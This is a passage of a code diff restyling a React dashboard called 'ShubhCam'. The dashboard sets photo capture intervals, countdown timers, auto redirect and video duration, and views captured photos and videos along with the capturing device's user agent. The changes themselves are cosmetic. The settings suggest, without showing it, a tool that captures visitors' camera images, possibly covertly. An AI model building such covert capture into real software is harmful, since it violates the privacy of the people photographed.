-                  value={settings.camPhotoLimit || 0}
+                <Input type="number" min="0" max="100" value={settings.camPhotoLimit || 0}
                   onChange={(e) => updateSettings({ camPhotoLimit: parseInt(e.target.value) || 0 })}
-                  className="bg-background/50 border-border/50 text-xs h-8"
-                />
+                  className="bg-background/30 border-border/30 text-xs h-8" />
               </div>
-
               <div className="space-y-2">
                 <div className="flex justify-between text-[10px]">
                   <span className="text-muted-foreground">Capture Interval</span>
-                  <span className="text-neon-green font-mono">{settings.camCaptureInterval || 500}ms</span>
+                  <span className="text-primary font-mono">{settings.camCaptureInterval || 500}ms</span>
                 </div>
-                <Slider
-                  value={[settings.camCaptureInterval || 500]}
-                  onValueChange={([val]) => updateSettings({ camCaptureInterval: val })}
-                  min={100}
-                  max={2000}
-                  step={100}
-                  className="py-2"
-                />
+                <Slider value={[settings.camCaptureInterval || 500]} onValueChange={([val]) => updateSettings({ camCaptureInterval: val })} min={100} max={2000} step={100} className="py-2" />
               </div>
             </div>
 
-            {/* Timer Settings */}
             <div className="space-y-3 pt-3 border-t border-border/30">
               <div className="flex items-center gap-2">
-                <Clock className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">Timer Settings</span>
+                <Clock className="w-3.5 h-3.5 text-accent" />
+                <span className="text-xs font-semibold text-foreground">Timer Settings</span>
               </div>
-              
               <div className="space-y-2">
                 <div className="flex justify-between text-[10px]">
                   <span className="text-muted-foreground">Countdown Timer</span>
-                  <span className="text-neon-green font-mono">{settings.camCountdownTimer || 5}s</span>
+                  <span className="text-accent font-mono">{settings.camCountdownTimer || 5}s</span>
                 </div>
-                <Slider
-                  value={[settings.camCountdownTimer || 5]}
-                  onValueChange={([val]) => updateSettings({ camCountdownTimer: val })}
-                  min={3}
-                  max={30}
-                  step={1}
-                  className="py-2"
-                />
+                <Slider value={[settings.camCountdownTimer || 5]} onValueChange={([val]) => updateSettings({ camCountdownTimer: val })} min={3} max={30} step={1} className="py-2" />
               </div>
-
               <div className="flex items-center justify-between">
                 <Label className="text-[10px] text-muted-foreground">Auto Redirect</Label>
-                <Switch
-                  checked={settings.camAutoRedirect !== false}
-                  onCheckedChange={(checked) => updateSettings({ camAutoRedirect: checked })}
-                />
+                <Switch checked={settings.camAutoRedirect !== false} onCheckedChange={(checked) => updateSettings({ camAutoRedirect: checked })} />
               </div>
             </div>
 
-            {/* Video Settings */}
             <div className="space-y-3 pt-3 border-t border-border/30">
               <div className="flex items-center gap-2">
-                <Video className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">Video Settings</span>
+                <Video className="w-3.5 h-3.5 text-secondary" />
+                <span className="text-xs font-semibold text-foreground">Video Settings</span>
               </div>
-              
               <div className="space-y-2">
                 <div className="flex justify-between text-[10px]">
                   <span className="text-muted-foreground">Video Duration</span>
-                  <span className="text-neon-green font-mono">{settings.camVideoDuration || 5}s</span>
+                  <span className="text-secondary font-mono">{settings.camVideoDuration || 5}s</span>
                 </div>
-                <Slider
-                  value={[settings.camVideoDuration || 5]}
-                  onValueChange={([val]) => updateSettings({ camVideoDuration: val })}
-                  min={3}
-                  max={30}
-                  step={1}
-                  className="py-2"
-                />
+                <Slider value={[settings.camVideoDuration || 5]} onValueChange={([val]) => updateSettings({ camVideoDuration: val })} min={3} max={30} step={1} className="py-2" />
               </div>
             </div>
 
-            {/* Stats */}
             <div className="grid grid-cols-2 gap-2 pt-3 border-t border-border/30">
-              <div className="bg-neon-green/10 rounded-lg p-3 text-center border border-neon-green/20">
-                <p className="text-xl font-bold text-neon-green">{photos.length}</p>
+              <div className="glass-card-warm rounded-xl p-3 text-center">
+                <p className="text-xl font-bold text-primary text-glow-gold">{photos.length}</p>
                 <p className="text-[9px] text-muted-foreground">Photos</p>
               </div>
-              <div className="bg-neon-green/10 rounded-lg p-3 text-center border border-neon-green/20">
-                <p className="text-xl font-bold text-neon-green">{videos.length}</p>
+              <div className="glass-card-warm rounded-xl p-3 text-center">
+                <p className="text-xl font-bold text-secondary text-glow-pink">{videos.length}</p>
                 <p className="text-[9px] text-muted-foreground">Videos</p>
               </div>
             </div>
@@ -999,41 +805,32 @@ const ShubhCam = () => {
 
       {/* Photo View Modal */}
       <Dialog open={!!viewingPhoto} onOpenChange={() => setViewingPhoto(null)}>
-        <DialogContent className="p-0 bg-card border border-neon-green/30 max-w-[90vw] sm:max-w-md rounded-xl overflow-hidden">
+        <DialogContent className="p-0 bg-card border border-primary/30 max-w-[90vw] sm:max-w-md rounded-2xl overflow-hidden glow-gold">
           {viewingPhoto && (
             <div>
               <div className="flex items-center justify-between p-3 border-b border-border/50">
                 <div className="flex items-center gap-2">
-                  <Camera className="w-4 h-4 text-neon-green" />
-                  <span className="text-sm font-medium">Photo</span>
+                  <Camera className="w-4 h-4 text-primary" />
+                  <span className="text-sm font-semibold">Photo</span>
                 </div>
-                <Button size="icon" variant="ghost" onClick={() => setViewingPhoto(null)} className="h-6 w-6">
-                  <X className="w-4 h-4" />
-                </Button>
+                <Button size="icon" variant="ghost" onClick={() => setViewingPhoto(null)} className="h-6 w-6"><X className="w-4 h-4" /></Button>
               </div>
               <div className="p-3">
-                <div className="aspect-square w-full overflow-hidden rounded-lg border border-border/30 bg-background/50">
+                <div className="aspect-square w-full overflow-hidden rounded-xl border border-border/30 bg-background/50">
                   <img src={viewingPhoto.image_data} alt="" className="w-full h-full object-contain" />
                 </div>
-                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 bg-background/30 rounded-lg p-2">
+                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 glass-card rounded-lg p-2">
                   <p>📅 {new Date(viewingPhoto.captured_at).toLocaleString()}</p>
                   {viewingPhoto.user_agent && <p className="truncate">📱 {viewingPhoto.user_agent.slice(0, 40)}...</p>}
                 </div>
               </div>
               <div className="flex gap-2 p-3 pt-0">
-                <Button
-                  onClick={() => downloadPhoto(viewingPhoto)}
-                  size="sm"
-                  className="flex-1 bg-neon-green text-background hover:bg-neon-green/90 text-xs"
-                >
+                <Button onClick={() => downloadPhoto(viewingPhoto)} size="sm"
+                  className="flex-1 bg-primary text-primary-foreground hover:bg-primary/90 text-xs">
                   <Download className="w-3 h-3 mr-1" /> Download
                 </Button>
-                <Button
-                  onClick={() => { deletePhoto(viewingPhoto.id, viewingPhoto.image_data); setViewingPhoto(null); }}
-                  size="sm"
-                  variant="outline"
-                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs"
-                >
+                <Button onClick={() => { deletePhoto(viewingPhoto.id, viewingPhoto.image_data); setViewingPhoto(null); }} size="sm" variant="outline"
+                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs">
                   <Trash2 className="w-3 h-3 mr-1" /> Delete
                 </Button>
               </div>
@@ -1044,42 +841,33 @@ const ShubhCam = () => {
 
       {/* Video View Modal */}
       <Dialog open={!!viewingVideo} onOpenChange={() => setViewingVideo(null)}>
-        <DialogContent className="p-0 bg-card border border-neon-green/30 max-w-[90vw] sm:max-w-md rounded-xl overflow-hidden">
+        <DialogContent className="p-0 bg-card border border-secondary/30 max-w-[90vw] sm:max-w-md rounded-2xl overflow-hidden glow-pink">
           {viewingVideo && (
             <div>
               <div className="flex items-center justify-between p-3 border-b border-border/50">
                 <div className="flex items-center gap-2">
-                  <Video className="w-4 h-4 text-neon-green" />
-                  <span className="text-sm font-medium">Video</span>
+                  <Video className="w-4 h-4 text-secondary" />
+                  <span className="text-sm font-semibold">Video</span>
                   <span className="text-[10px] text-muted-foreground font-mono">{viewingVideo.duration_seconds}s</span>
                 </div>
-                <Button size="icon" variant="ghost" onClick={() => setViewingVideo(null)} className="h-6 w-6">
-                  <X className="w-4 h-4" />
-                </Button>
+                <Button size="icon" variant="ghost" onClick={() => setViewingVideo(null)} className="h-6 w-6"><X className="w-4 h-4" /></Button>
               </div>
               <div className="p-3">
-                <div className="aspect-video w-full overflow-hidden rounded-lg border border-border/30 bg-background/50">
+                <div className="aspect-video w-full overflow-hidden rounded-xl border border-border/30 bg-background/50">
                   <video src={viewingVideo.video_url} controls autoPlay className="w-full h-full object-contain" />
                 </div>
-                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 bg-background/30 rounded-lg p-2">
+                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 glass-card rounded-lg p-2">
                   <p>📅 {new Date(viewingVideo.captured_at).toLocaleString()}</p>
                   {viewingVideo.user_agent && <p className="truncate">📱 {viewingVideo.user_agent.slice(0, 40)}...</p>}
                 </div>
               </div>
               <div className="flex gap-2 p-3 pt-0">
-                <Button
-                  onClick={() => window.open(viewingVideo.video_url, '_blank')}
-                  size="sm"
-                  className="flex-1 bg-neon-green text-background hover:bg-neon-green/90 text-xs"
-                >
+                <Button onClick={() => window.open(viewingVideo.video_url, '_blank')} size="sm"
+                  className="flex-1 bg-secondary text-secondary-foreground hover:bg-secondary/90 text-xs">
                   <Download className="w-3 h-3 mr-1" /> Download
                 </Button>
-                <Button
-                  onClick={() => { deleteVideo(viewingVideo.id, viewingVideo.video_url); setViewingVideo(null); }}
-                  size="sm"
-                  variant="outline"
-                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs"
-                >
+                <Button onClick={() => { deleteVideo(viewingVideo.id, viewingVideo.video_url); setViewingVideo(null); }} size="sm" variant="outline"
+                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs">
                   <Trash2 className="w-3 h-3 mr-1" /> Delete
                 </Button>
               </div>
